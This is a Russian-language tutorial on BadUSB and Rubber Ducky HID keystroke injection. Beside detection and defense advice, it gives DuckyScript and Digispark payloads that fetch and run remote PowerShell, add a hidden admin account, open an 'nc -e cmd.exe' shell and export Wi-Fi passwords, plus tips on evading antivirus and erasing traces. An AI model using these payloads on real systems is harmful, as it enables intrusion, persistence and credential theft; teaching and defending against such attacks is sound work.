**BadUSB** — класс атак, при которых USB-устройство представляется доверенной периферией (обычно клавиатурой, класс HID) и вводит заранее заготовленные команды. Название закрепилось после доклада 2014 года, показавшего, что контроллеры USB можно перепрошивать через их же firmware. **Rubber Ducky** — коммерческая реализация этой идеи от Hak5: маленькая «флешка», которая набирает DuckyScript с огромной скоростью. Этот урок — практика HID-инъекции.

## Как работает HID-инъекция

Клавиатура общается с хостом через **HID-отчёты** (report). Каждый отчёт — 8 байт: байт модификаторов (Ctrl/Shift/Alt/GUI), зарезервированный байт, и до 6 кодов одновременно нажатых клавиш. Отпускание — отчёт из нулей. Хост не проверяет, «настоящая» ли это клавиатура: если дескриптор говорит HID Keyboard, ОС принимает ввод.

Инъекция = устройство отправляет последовательность отчётов так, будто человек печатает. Разница: скорость. Rubber Ducky выдаёт до ~1000 слов в минуту; ОС воспринимает это как обычный ввод.

## Почему контроллеры USB перепрошиваемы

Многие USB-контроллеры хранят прошивку в изменяемой памяти и позволяют её обновить без специального оборудования. Если перепрошить устройство, оно «превращается» в другое — этот принцип и есть BadUSB. Практически чаще берут готовые платформы (Digispark, Rubber Ducky, Flipper), где смена поведения — штатная функция.

## DuckyScript: язык payload'ов

DuckyScript — простой язык команд для Rubber Ducky. Основные инструкции:

```duckyscript
DELAY 1000          // подождать загрузки ОС
GUI r               // Win+R
DELAY 500
STRING powershell   // набрать текст
ENTER
DELAY 1500
STRING -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/a.ps1')"
ENTER
```

| Команда | Назначение |
|---------|-----------|
| `STRING` | набрать текст |
| `DELAY` | пауза (мс) |
| `GUI` / `CTRL` / `ALT` | модификаторы |
| `ENTER` / `TAB` / `ESC` | спецклавиши |
| `REPEAT` | повторить строку N раз |
| `DEFAULT_DELAY` | глобальная задержка |

Важно: скорость и задержки подбираются под целевую ОС. Слишком быстрый ввод на медленном хосте теряет символы; слишком медленный — риск, что пользователь заметит.

## Платформы

- **Rubber Ducky** (Hak5) — эталон, DuckyScript 1.0/3.0, есть Payload Studio.
- **Digispark ATtiny85** — дешёвая плата, прошивается Arduino IDE, эмулирует HID.
- **Flipper Zero** — режим Bad USB, скрипты в `badusb/`, есть встроенный DuckyScript.
- **Raspberry Pi Pico** — CircuitPython + `adafruit_hid`, гибко.
- **O.MG Cable** — кабель со встроенным имплантом и Wi-Fi управлением.
- **Malduino** — open-source клон.

## Полезные payload'ы (для лаборатории)

Типовые сценарии red team:

1. **Обратный shell** — скачать и запустить implant.
2. **Создание учётки** — `net user pentest Passw0rd! /add && net localgroup administrators pentest /add`.
3. **Эксфильтрация Wi-Fi паролей** — `netsh wlan show profiles` → отправка.
4. **Отключение AV** (в рамках согласованного теста) через PowerShell.
5. **Запуск слушателя** — `nc -e cmd.exe`.

Пример для Flipper Zero (`badusb/win_revshell.txt`):

```
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "..." 
ENTER
```

## Разобранный пример: сборка payload на Digispark

```bash
# 1. Arduino IDE, плата Digispark (ATtiny85), библиотека DigiKeyboard
# 2. Скетч:
cat > duck.ino <<'EOF'
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win+R
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("whoami > %TEMP%\\out.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {}
EOF
# 3. Прошиваем, вставляем в целевой хост, наблюдаем результат
```

Проверить, что устройство действительно определилось как HID, можно на своей машине через `lsusb -v` (класс интерфейса 0x03).

## Анализ и детект HID-инъекции

С точки зрения защитника, HID-инъекцию видно по аномалиям:

- **Скорость**: интервалы между нажатиями микросекундные, человек так не печатает.
- **Отсутствие «человеческих» пауз** и ошибок.
- **Подозрительные комбинации** сразу после подключения (Win+R, PowerShell).
- **USB-трафик**: в usbmon видна ровная последовательность HID-отчётов.

```bash
# Снять и посмотреть HID-трафик
sudo modprobe usbmon
sudo dumpcap -i usbmon1 -w badusb.pcap -a duration:10
tshark -r badusb.pcap -Y 'usbhid.data && usbhid.data != 0000000000000000' \
  -T fields -e frame.time_delta -e usbhid.data | head
```

Малые `frame.time_delta` между нажатиями — признак автоматизации.

## Защита

- **Отключить неиспользуемые USB-порты** (физически или через политику).
- **Device Control / allowlist по VID/PID** (Endpoint-защита, Windows GPO).
- **Блокировать новые HID на заблокированном экране**.
- **Обучать сотрудников**: не вставлять найденные флешки.
- **USB-порты только для зарядки** (data blocker) в публичных местах.

## Частые ошибки и подводные камни

- **Неверная раскладка**: DuckyScript набирает по US-раскладке; на другой ОС символы «поедут».
- **Слишком быстрый ввод**: медленные машины теряют нажатия — добавьте `DELAY`.
- **Забыли `DELAY` на загрузку ОС**: payload уходит «в никуда».
- **Антивирус блокирует PowerShell**: нужны обфускация/обход, но это уже за рамками железа.
- **Flipper/платы требуют прошивки**: сначала обновить firmware, потом заливать скрипты.

## DuckyScript 3.0 и Payload Studio

DuckyScript 3.0 добавил переменные, условия и функции — payload'ы стали настоящими программами. Пример с переменной и ожиданием:

```duckyscript
DEFINE #HOST 10.0.0.1
DELAY 1500
GUI r
DELAY 500
STRING powershell -w hidden -c "iwr http://#HOST/a.ps1|iex"
ENTER
```

**Payload Studio** (Hak5) — веб/десктоп-редактор: подсветка синтаксиса, генерация .txt для Ducky, конвертация в формат Flipper. Для Flipper Zero скрипты кладут в `/ext/badusb/`, для Rubber Ducky — на microSD. При конвертации между платформами проверяйте задержки: разные платформы по-разному таймингуют нажатия.

## Обход защит ОС

Современные ОС противодействуют автоматическому вводу:

- **UAC/запросы прав**: payload не может «нажать» в защищённый диалог с другого рабочего стола. Решения — использовать легитимные пути (запуск от текущего пользователя), эксплуатировать уже выданные права.
- **Windows Defender/EDR**: блокирует PowerShell-загрузки; нужны обфускация, LOLBins, signed-бинари.
- **Экран блокировки**: некоторые ОС блокируют новые HID на lock screen (Windows с определёнными политиками).
- **Раскладка и язык**: если система на русском, US-раскладка DuckyScript «поедет» — payload нужно строить из символов, доступных в обеих раскладках, либо переключать язык.

Практический приём: payload не должен «звенеть». Быстрая инъекция, отсутствие окон, отложенный запуск, очистка следов (история, temp-файлы).

## Flipper Zero: практика

Flipper Zero — самый доступный инструмент для HID-инъекции. Порядок работы:

```bash
# 1. Обновить прошивку Flipper (qFlipper)
# 2. Закинуть скрипт на SD: badusb/win_test.txt
# 3. На устройстве: Apps -> USB -> Bad USB -> выбрать скрипт -> Run
# 4. Flipper подключается как HID и набирает payload
```

Flipper поддерживает подмножество DuckyScript (`STRING`, `DELAY`, `GUI`, `ALT`, `CTRL`, `ENTER`, `REPEAT`). Для отладки удобно сначала прогнать payload на своей машине с открытым текстовым редактором — увидеть, что именно набирается, и поправить раскладку/задержки.

## Правовые и этические рамки

BadUSB и HID-инъекция — это активное вмешательство. Применять их можно **только**:

- на собственном оборудовании в изолированной лаборатории;
- в рамках письменно согласованного пентеста/red-team с чётко очерченным scope;
- в CTF, где цель и правила явно разрешают такие действия.

Несогласованная HID-инъекция на чужой машине — это неправомерный доступ, даже если «ничего не сломалось». Фиксируйте согласие, ограничивайте воздействие и убирайте за собой (удаляйте созданные учётки, файлы, слушателей).

## HID за пределами клавиатуры

HID — это не только клавиатура. Тот же класс охватывает мышь, геймпад, джойстик, media-контроллеры, дигитайзеры и даже сенсоры. Это расширяет арсенал инъекции:

- **Мышь**: движение курсора к кнопке и клик — обход некоторых защит от «клавиатурной» автоматизации.
- **Media-клавиши**: открытие браузера/почты через мультимедийные кнопки.
- **Комбинация клавиатура+мышь**: одно устройство с несколькими HID-интерфейсами выглядит как комплект «клавиатура + мышь», что повышает доверие.
- **Consumer Control**: кнопки яркости/громкости, которые ОС обрабатывает особым путём.

Практический приём: если политики блокируют «новую клавиатуру», иногда проходит эмуляция мыши или композитного устройства. Защитнику важно контролировать **все** HID-подклассы, а не только клавиатуру.
